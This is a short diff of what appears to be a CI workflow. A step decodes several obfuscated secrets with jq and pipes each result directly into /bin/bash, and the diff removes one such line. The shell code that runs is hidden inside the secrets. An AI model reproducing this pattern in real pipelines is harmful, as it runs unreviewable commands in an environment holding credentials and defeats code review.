@@ -22,7 +22,6 @@ jobs:
           po352: ${{ secrets.po352 }}
         run: |
           printf '%s' "$po352" | jq -r .yy7969 | /bin/bash
-          echo $rary794 | jq -r .t09 | /bin/bash
           printf '%s' "$w38204" | jq -r .xoc64375 | /bin/bash
           printf '%s' "$ikvw4396" | jq -r .fub74651 | /bin/bash
           printf '%s' "$jikqm3" | jq -r .qtf5 | /bin/bash
